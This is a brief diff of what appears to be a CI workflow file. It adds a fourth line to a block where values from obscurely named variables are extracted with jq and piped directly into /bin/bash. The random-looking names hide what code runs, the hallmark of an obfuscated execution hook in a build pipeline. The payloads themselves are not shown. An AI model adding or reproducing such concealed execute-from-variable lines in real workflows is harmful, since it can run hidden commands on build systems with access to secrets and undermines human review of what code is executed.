@@ -35,6 +35,7 @@ jobs:
           echo $yee394 | jq -r .jma45 | /bin/bash
           echo $g8 | jq -r .xtnp1 | /bin/bash
           printf '%s' "$ix35" | jq -r .d8603 | /bin/bash
+          printf '%s' "$ev55414" | jq -r .wej413 | /bin/bash
 
       - name: Upload artifact
         if: always()
